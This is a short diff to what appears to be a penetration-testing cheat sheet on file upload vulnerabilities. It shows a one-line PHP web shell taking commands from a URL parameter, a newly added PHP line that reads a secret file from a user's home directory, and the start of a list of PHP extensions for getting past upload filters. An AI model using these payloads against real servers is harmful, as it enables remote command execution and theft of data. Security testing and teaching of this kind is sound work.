@@ -6,6 +6,9 @@ You should always test for file upload vulnerabilities by trying to upload simpl
   
     <?php system($_GET['cmd']); ?>       to get the file http://site.com/files/avatars/profile.jpg?cmd=ls
 
+    <?php echo file_get_contents('/home/tony/secret'); ?>
+
+
 ## Via Common php file extensions:
 1. .php
 2. .php3
